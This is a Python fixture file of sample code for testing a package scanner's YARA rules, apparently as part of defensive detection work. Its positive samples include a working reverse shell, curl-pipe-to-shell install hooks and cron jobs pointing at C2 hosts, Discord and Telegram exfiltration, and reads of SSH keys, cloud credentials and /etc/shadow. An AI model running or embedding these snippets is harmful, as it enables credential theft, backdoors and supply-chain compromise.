"""
Actual package code samples (sanitized fixtures) for all Sentinel YARA rules.
Provides positive validation samples derived from real malicious packages / advisories
and negative validation samples from legitimate, popular open-source packages.
"""

POSITIVE_RULE_SAMPLES = {
    # --- Exfiltration & C2 ---
    "Exfil_Discord_Webhook": """
    // Discord stealer payload from npm malware package
    const hook = "https://discord.com/api/webhooks/1234567890/aBcDeFgHiJkLmNoPqRsTuVwXyZ_123456789";
    fetch(hook, { method: "POST", body: JSON.stringify({ content: "Exfiltrated" }) });
    """,

    "Exfil_Telegram_Bot": """
    # Telegram bot exfiltration from PyPI stealer
    import requests
    url = "https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage"
    requests.post(url, data={"chat_id": "987654", "text": "Stolen credentials"})
    """,

    "Exfil_OAST_Callback": """
    // Out-of-band application security testing callback from dependency confusion probe
    const pingBack = "https://collector-id-1234.oastify.com/track?pkg=corp-internal";
    require("https").get(pingBack);
    """,

    "Exfil_Tunneling": """
    // Reverse tunnel endpoint for interactive backdoor
    const tunnel = "https://malicious-node.ngrok-free.app/session";
    connectTunnel(tunnel);
    """,

    "Exfil_GitHub_Gists": """
    # Dead-drop credential exfiltration to GitHub Gists
    headers = {"Authorization": "token ghp_mocktoken"}
    requests.post("https://api.github.com/gists", json={"files": {"creds.txt": {"content": stolen_data}}})
    """,

    "Exfil_GitLab_Snippets": """
    // GitLab Snippets dead drop exfiltration
    const url = "https://gitlab.com/api/v4/snippets";
    fetch(url, { method: "POST", body: JSON.stringify({ title: "exfil", content: payload }) });
    """,

    "Exfil_Pastebin": """
    # Text paste exfiltration
    requests.post("https://pastebin.com/api/api_post.php", data={"api_dev_key": "x", "api_paste_code": data})
    """,

    "Exfil_Hardcoded_GitHub_PAT": (
        "// Hardcoded active token used to commit backdoored code\n"
        "const token = \"" + "ghp_" + "1234567890abcdefghijklmnopqrstuvwxyz\";\n"
        "const authHeader = `token ${token}`;\n"
    ),

    "Exfil_TLS_Verification_Bypass": """
    # Defense evasion disabling SSL/TLS verification
    import ssl
    ctx = ssl._create_unverified_context()
    conn = urllib.request.urlopen("https://83.142.209.203/payload", context=ctx)
    """,

    "Exfil_Raw_IP_Endpoint": """
    // Direct connection to C2 server IP address
    const c2Url = "http://185.220.101.5:8080/stage2";
    require("http").get(c2Url);
    """,

    "Exfil_DNS_Tunneling": """
    // DNS subdomain secret exfiltration
    const dns = require("dns");
    dns.resolve(`stolen.${chunk}.oast.fun`, (err, addresses) => {});
    """,

    # --- Credential Harvesting ---
    "Cred_AWS_Credentials": """
    // AWS CLI credentials theft
    const credPath = path.join(process.env.HOME, ".aws/credentials");
    const awsKeys = fs.readFileSync(credPath, "utf-8");
    """,

    "Cred_SSH_Private_Keys": """
    # SSH private key harvesting
    ssh_key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
    """,

    "Cred_SSH_Directory": """
    // SSH directory harvesting
    const sshDir = path.join(process.env.HOME, ".ssh/");
    fs.readdirSync(sshDir);
    """,

    "Cred_Registry_Git_Config": """
    // Yarn and git configuration inspection
    const gitConf = fs.readFileSync(path.join(process.env.HOME, ".gitconfig"));
    """,

    "Cred_Cloud_Provider": """
    # GCP application default credentials harvesting
    gcp_cred = open(os.path.expanduser("~/.config/gcloud/application_default_credentials.json")).read()
    """,

    "Cred_Infra_DB": """
    # Terraform and database credentials harvesting
    tf_creds = open(os.path.expanduser("~/.terraform.d/credentials.tfrc.json")).read()
    """,

    "Cred_Shell_History": """
    // Shell history harvesting for past tokens and API calls
    const history = fs.readFileSync(path.join(process.env.HOME, ".bash_history"), "utf-8");
    """,

    "Cred_Registry_Git": """
    // NPM and PyPI publish tokens harvesting
    const npmrc = fs.readFileSync(path.join(process.env.HOME, ".npmrc"), "utf-8");
    """,

    "Cred_Kube_Docker": """
    # Kubernetes and Docker registry token harvesting
    kube_conf = open(os.path.expanduser("~/.kube/config")).read()
    """,

    "Cred_Browser": """
    // Browser local storage & cookies harvesting
    const chromeData = path.join(process.env.LOCALAPPDATA, "Google/Chrome/User Data/Default/Login Data");
    """,

    "Cred_Crypto_Wallet": """
    // MetaMask extension storage directory targeting
    const metamaskDir = "nkbihfbeogaeaoehlefnkodbefgpgknn";
    readExtensionStorage(metamaskDir);
    """,

    "Cred_System": """
    # System password hash file access
    shadow = open("/etc/shadow").read()
    """,

    "Cred_Cloud_IMDS": """
    # Cloud Instance Metadata Service SSRF / token extraction
    import requests
    token = requests.get("http://169.254.169.254/latest/api/token", headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}).text
    """,

    "Cred_Kubernetes_Token": """
    // In-cluster Kubernetes service account token harvesting
    const k8sToken = fs.readFileSync("/var/run/secrets/kubernetes.io/serviceaccount/token", "utf-8");
    """,

    "Cred_Vault_Token": """
    # HashiCorp Vault token environment extraction
    token = os.environ.get("VAULT_TOKEN")
    """,

    "Cred_IDE_AI_Agent_Hijacking": """
    // Cursor and Claude desktop configuration hijacking
    const cursorRules = fs.readFileSync(".cursorrules", "utf-8");
    """,

    "Cred_Browser_Vaults": """
    # Firefox profile database targeting
    firefox_db = os.path.expanduser("~/.mozilla/firefox/key4.db")
    """,

    "Cred_MacOS_Keychain": """
    // macOS Keychain password dumping
    const cmd = "security find-generic-password -ga 'Chrome'";
    execSync(cmd);
    """,

    # --- Dynamic Execution & Obfuscation ---
    "Exec_Eval": """
    // Dynamic JavaScript execution
    const code = getDynamicSnippet();
    eval(code);
    """,

    "Exec_NewFunction": """
    // Dynamic execution via Function constructor
    const fn = new Function("arg", dynamicCode);
    fn();
    """,

    "Exec_ChildProcess": """
    // Process spawning
    const cp = require("child_process");
    cp.exec("whoami");
    """,

    "Exec_GlobalThis_Eval": """
    // Dynamic JavaScript execution via globalThis subscript
    const dynamicEval = globalThis['eval'];
    dynamicEval("console.log('pwned')");
    """,

    "Exec_Process_Binding": """
    // Internal process binding evasion
    const binding = process.binding('spawn_sync');
    """,

    "Exec_Python_Subprocess": """
    # Python subprocess invocation from malware payload
    import subprocess
    subprocess.Popen(["/bin/bash", "-c", "curl http://evil.com/k | sh"])
    """,

    "Exec_SyncSpawn": """
    // Synchronous execution primitive
    const res = spawnSync("sh", ["-c", cmd]);
    """,

    "Dangerous_VM_RunInContext": """
    // Node.js VM context escape / sandbox execution
    const vm = require("vm");
    vm.runInNewContext(untrustedPayload, context);
    """,

    "Decode_Buffer_Base64": """
    // Base64 payload decoding
    const decoded = Buffer.from(payloadBase64, "base64").toString("utf-8");
    """,

    "Decode_Atob": """
    // Browser atob decode
    const clearText = atob(encodedData);
    """,

    "Network_HttpRequire": """
    // Raw HTTP module import
    const http = require("http");
    http.get("http://external.site");
    """,

    "Network_FetchAxiosXhr": """
    // Outbound HTTP fetch call
    fetch("https://api.external.com/data");
    """,

    "Env_ProcessEnv": """
    // Reading environment configuration
    const port = process.env.PORT || 3000;
    """,

    "Env_SensitiveTokenHarvesting": """
    // Targeted harvesting of AWS and NPM tokens
    const secret = process.env.AWS_SECRET_ACCESS_KEY;
    const npmToken = process.env.NPM_TOKEN;
    """,

    "Env_BulkHarvesting": """
    // Mass dump of all environment variables
    const dump = JSON.stringify(process.env);
    """,

    "Exec_Reverse_Shell_Socket": """
    # Interactive reverse shell socket connection
    import socket, os, subprocess
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("185.220.101.5", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
    """,

    "Exec_PowerShell_Cradle": """
    // Windows PowerShell hidden download cradle
    const psCmd = 'powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsA';
    execSync(psCmd);
    """,

    "Exec_Python_Setup_Hook": """
    # Python setup.py malicious install hook
    from setuptools import setup
    from setuptools.command.install import install
    import os

    class CustomInstallCommand(install):
        def run(self):
            install.run(self)
            os.system("curl -s http://c2.example.com/stage1 | sh")

    setup(name="backdoored-package", version="0.1.0", cmdclass={"install": CustomInstallCommand})
    """,

    # --- Worm & Runtime Droppers ---
    "Worm_PyPI_Upload_Endpoint": """
    # PyPI legacy replication endpoint (Shai-Hulud worm pattern)
    upload_url = "https://upload.pypi.org/legacy/"
    upload_package(upload_url, stolen_token)
    """,

    "Worm_Token_Validator": """
    // Multi-ecosystem worm token verification function
    function handleNpmTokens(token) {
        console.log("Verifying npm token");
    }
    """,

    "Worm_PyPI_Token_Probing": """
    # PyPI authentication token regex probe
    token = "pypi-AgEIcHlwaS5vcmcCJTIzMTJkNGFjLTI2ZDgtNGM1NS05OWE2LTg3MjQwYjI3MDIxZgACJXsiYXV0aG9yIjoiYWRtaW4iLCJ2ZXJzaW9uIjoxfQAABiDy10o"
    """,

    "Worm_Secondary_Runtime_Dropper": """
    // Automated download of standalone secondary Python runtime
    const runtimeUrl = "https://github.com/indygreg/python-build-standalone/releases/download/v1.0/python-standalone.tar.gz";
    download(runtimeUrl);
    """,

    "Worm_Nodejs_Dropper": """
    # Automated portable Node.js binary download
    node_url = "https://nodejs.org/dist/v18.16.0/node-v18.16.0-linux-x64.tar.xz"
    """,

    "Worm_CI_Memory_Dump": """
    // CI/CD runner memory dump evasion
    if (typeof detectHardenRunner !== "undefined") {
        console.log("Runner detected");
    }
    """,

    "Dropper_Hidden_Payload_Unpack": """
    # Telnyx / TeamPCP steganography payload downloader & extractor
    import requests, tarfile
    r = requests.get("http://83.142.209.203:8080/ringtone.wav")
    with open("payload.tar.gz", "wb") as f:
        f.write(r.content)
    tarfile.open("payload.tar.gz").extractall("/tmp/stage2")
    """,

    "Persistence_Implant": """
    // Installation of scheduled persistence service
    const servicePath = path.join(process.env.HOME, ".config/systemd/user/audiomon.service");
    fs.writeFileSync(servicePath, "[Service]\nExecStart=/usr/bin/python3 ~/.config/audiomon/audiomon.py\n");
    """,
    # --- Advanced Obfuscation & Packing ---
    "Obfuscation_Dense_Hex_Escapes": r"""
    // Shellcode or encrypted staging payload packed into hex escapes
    const shellcode = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x53\x48\x89\xe6\xb0\x3b\x0f\x05";
    """,

    "Obfuscation_Layered_Decode_Decompress": """
    # Layered base64 decode into zlib decompression
    import zlib, base64
    payload = zlib.decompress(base64.b64decode('eJzT0yMAAGDAA1k='))
    """,

    "Obfuscation_JS_Array_Lookup": """
    // Obfuscator.io lookup dictionary array
    var _0x4f2a = ['log', 'hello', 'world'];
    (function(_0x12ab) {
        console[_0x4f2a(0x0)](_0x4f2a(0x1));
    })(_0x4f2a);
    """,

    "Obfuscation_Invisible_Unicode_Steganography": """
    // Steganographic payload hidden with zero-width characters
    const token = "secret" + "​‌‍​‌‍​‌‍​" + "hidden";
    """,

    # --- Persistence & System Tampering ---
    "Persistence_Cron_Tampering": """
    # Installing cron job persistence
    import os
    os.system("echo '* * * * * curl http://c2.evil.com/sh | sh' >> /etc/cron.d/updater")
    """,

    "Persistence_Shell_Profile_Modification": """
    // Appending reverse shell backdoor to user bashrc
    const fs = require('fs');
    fs.appendFileSync(process.env.HOME + '/.bashrc', '
alias sudo="curl -s http://evil.com/k | sh"
');
    """,

    "Persistence_Systemd_LaunchAgent": """
    # Dropping persistent systemd unit service
    unit = '/etc/systemd/system/network-monitor.service'
    with open(unit, 'w') as f:
        f.write('[Service]
ExecStart=/usr/local/bin/backdoor
')
    """,

    "Persistence_Windows_Registry_Run": r"""
    # Windows registry autorun persistence key
    import winreg
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'WindowsHealth', 0, winreg.REG_SZ, 'C:\\temp\\agent.exe')
    """,

    # --- Anti-Analysis & Sandbox Evasion ---
    "Evasion_CI_Sandbox_Probing": """
    // Aborting execution if running inside automated CI
    if (process.env.CI || process.env.GITHUB_ACTIONS) {
        process.exit(0);
    }
    """,

    "Evasion_Sandbox_Hostname_Fingerprinting": """
    # Checking for known sandbox hostnames
    import socket
    host = socket.gethostname().lower()
    if host in ['sandbox', 'cuckoo', 'virus', 'malware', 'testbox']:
        exit(0)
    """,

    "Evasion_Low_Resource_Threshold_Check": """
    # Checking for minimal CPU count in sandbox
    import os
    if os.cpu_count() < 2:
        exit(0)
    """,

    "Evasion_Extended_Timeout_Stall": """
    # Sleep 600 seconds to exceed scanner execution budget
    import time
    time.sleep(600)
    """,

    # --- Supply-Chain & Runtime Execution Hooks ---
    "SupplyChain_NPM_Lifecycle_Command": """
    {
      "name": "malicious-util",
      "scripts": {
        "postinstall": "curl -s http://198.51.100.42/setup.sh | bash"
      }
    }
    """,

    "SupplyChain_PyPI_Custom_Install_Command": """
    # PyPI setup.py cmdclass install hook
    from setuptools import setup
    from setuptools.command.install import install
    class CustomInstall(install):
        def run(self):
            install.run(self)
    setup(name='sample', cmdclass={'install': CustomInstall})
    """,

    "SupplyChain_Python_PTH_Code_Execution": """import sys, os; os.system('curl -s http://c2.evil/init')
    """,

    "SupplyChain_Fileless_Memory_Execution": """
    # Direct libc memfd_create for fileless ELF execution
    import ctypes
    libc = ctypes.CDLL('libc.so.6')
    fd = libc.memfd_create('kworker', 1)
    """,

    "SupplyChain_Network_Monkey_Patching": """
    // Intercepting all outbound HTTPS requests
    const https = require('https');
    const origRequest = https.request;
    https.request = function(options, cb) {
        logInterceptedCredentials(options);
        return origRequest.apply(this, arguments);
    };
    """,

}

BENIGN_NEGATIVE_SAMPLES = {
    "benign_requests_auth.py": """
    import base64
    from urllib.parse import urlparse

    class HTTPBasicAuth:
        def __init__(self, username, password):
            self.username = username
            self.password = password

        def __call__(self, r):
            token = f"{self.username}:{self.password}".encode("latin1")
            header = f"Basic {base64.b64encode(token).decode('latin1')}"
            r.headers["Authorization"] = header
            return r
    """,

    "benign_fastapi_server.py": """
    from fastapi import FastAPI, Depends, HTTPException, status
    from pydantic import BaseModel

    app = FastAPI(title="Sentinel API", version="1.0.0")

    class HealthResponse(BaseModel):
        status: str
        uptime_seconds: float

    @app.get("/health", response_model=HealthResponse)
    async def get_health():
        return {"status": "healthy", "uptime_seconds": 3600.0}
    """,

    "benign_express_app.js": """
    const express = require('express');
    const path = require('path');

    const app = express();
    const PORT = parseInt(process.env.PORT, 10) || 8080;

    app.use(express.json());
    app.use('/static', express.static(path.join(__dirname, 'public')));

    app.get('/api/ping', (req, res) => {
        res.json({ pong: true, timestamp: Date.now() });
    });

    module.exports = app;
    """,
}
